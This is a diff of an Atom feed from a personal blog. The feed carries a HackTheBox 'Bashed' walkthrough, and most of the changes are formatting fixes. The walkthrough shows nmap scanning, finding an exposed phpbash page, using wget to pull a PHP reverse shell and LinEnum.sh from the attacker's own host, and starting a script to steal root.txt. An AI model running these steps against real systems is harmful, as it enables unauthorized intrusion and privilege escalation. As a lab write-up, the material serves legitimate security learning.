@@ -1,21 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom"><title>Random stuff - HackTheBox</title><link href="/" rel="alternate"></link><link href="/feeds/hackthebox.atom.xml" rel="self"></link><id>/</id><updated>2020-01-13T20:00:00+01:00</updated><entry><title>Bashed</title><link href="/bashed.html" rel="alternate"></link><published>2020-01-13T20:00:00+01:00</published><updated>2020-01-13T20:00:00+01:00</updated><author><name>Paweł Mateja</name></author><id>tag:None,2020-01-13:/bashed.html</id><summary type="html">&lt;p&gt;Solution to the &lt;em&gt;Bashed&lt;/em&gt; VM&lt;/p&gt;</summary><content type="html">&lt;h1&gt;User flag&lt;/h1&gt;
-&lt;p&gt;It is not really necessary to start this one with &lt;em&gt;nmap&lt;/em&gt;, but it's never a bad first step&lt;/p&gt;
+&lt;p&gt;It is not really necessary to start this one with &lt;strong&gt;nmap&lt;/strong&gt;, but it's never a bad first step&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kali:~# nmap -sS -Pn -sV &lt;span class="m"&gt;10&lt;/span&gt;.10.10.68
-Starting Nmap &lt;span class="m"&gt;7&lt;/span&gt;.70 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2020&lt;/span&gt;-01-13 &lt;span class="m"&gt;13&lt;/span&gt;:20 CET
-Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.68
-Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.11s latency&lt;span class="o"&gt;)&lt;/span&gt;.
-Not shown: &lt;span class="m"&gt;999&lt;/span&gt; closed ports
-PORT   STATE SERVICE VERSION
-&lt;span class="m"&gt;80&lt;/span&gt;/tcp open  http    Apache httpd &lt;span class="m"&gt;2&lt;/span&gt;.4.18 &lt;span class="o"&gt;((&lt;/span&gt;Ubuntu&lt;span class="o"&gt;))&lt;/span&gt;
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in &lt;span class="m"&gt;10&lt;/span&gt;.24 seconds
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;As we can see, only port 80 is opened. After opening it in web browser, there is a unfinished, but already launched website. We can dig a bit through it, just to learn that it is connected to a &lt;em&gt;phpbash&lt;/em&gt; project. That's nice, but we want to speed things up.&lt;/p&gt;
-&lt;p&gt;We can run several tools to look for cool and useful, but hidden urls. My first choice here is DirBuser.
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-13 13:20 CET
+Nmap scan report for 10.10.10.68
+Host is up (0.11s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;As we can see, only port 80 is opened. After opening it in web browser, there is a unfinished, but already launched website. We can dig a bit through it, just to learn that it is connected to a &lt;strong&gt;phpbash&lt;/strong&gt; project. That's nice, but we want to speed things up.&lt;/p&gt;
+&lt;p&gt;We can run several tools to look for cool and useful, but hidden urls. My first choice here is DirBuster.
 It takes him a few minutes to find the thing we need:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://10.10.10.68/dev/phpbash.php
 &lt;/pre&gt;&lt;/div&gt;
@@ -30,7 +33,7 @@ $ cat /home/arrexel/user.txt
 &lt;p&gt;Yup, we got it!&lt;/p&gt;
 &lt;h1&gt;Root flag&lt;/h1&gt;
 &lt;p&gt;&lt;em&gt;phpbash&lt;/em&gt; is nice, but doesn't provide a full terminal experience. A reverse shell is wat we need.&lt;/p&gt;
-&lt;p&gt;Firstly we need a place in the /var/www/html path to store it. Only the &lt;em&gt;upload&lt;/em&gt; dir will do, but we need nothing more. Except of course of a php reverse shell with out IP in it's config. I've already got it on my Kali VM, served by an apache instance, so it's easy:&lt;/p&gt;
+&lt;p&gt;Firstly we need a place in the /var/www/html path to store it. Only the &lt;strong&gt;upload&lt;/strong&gt; dir will do, but we need nothing more. Except of course of a php reverse shell with out IP in it's config. I've already got it on my Kali VM, served by an apache instance, so it's easy:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;www-data:/var/www/html/uploads# wget &lt;span class="m"&gt;10&lt;/span&gt;.10.14.16/shell.php
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -43,7 +46,7 @@ $ cat /home/arrexel/user.txt
 &lt;p&gt;It works, so now the same thing in &lt;em&gt;/tmp&lt;/em&gt; dir &lt;em&gt;LinEnum&lt;/em&gt;&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /tmp
 wget &lt;span class="m"&gt;10&lt;/span&gt;.10.14.16/LinEnum.sh
-bash LinEnum.sh
+bash ./LinEnum.sh
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -62,8 +65,8 @@ User www-data may run the following commands on bashed:
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Works. What next? We need something to find a point for privilege escalation. &lt;em&gt;pspy&lt;/em&gt; will help us with it.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pspy64
+&lt;p&gt;Works. What next? We need something to find a point for privilege escalation. &lt;strong&gt;pspy&lt;/strong&gt; will help us with it.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./pspy64
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -72,7 +75,7 @@ User www-data may run the following commands on bashed:
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Nice, we can see, that &lt;em&gt;/scrips&lt;/em&gt; dir is owned by &lt;em&gt;scriptmanager&lt;/em&gt;!&lt;/p&gt;
+&lt;p&gt;Nice, we can see, that &lt;strong&gt;/scrips&lt;/strong&gt; dir is owned by &lt;strong&gt;scriptmanager&lt;/strong&gt;!&lt;/p&gt;
 &lt;p&gt;Now we need a tiny root.txt stealing python script. It doesn't need to be fancy.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;shutil&lt;/span&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
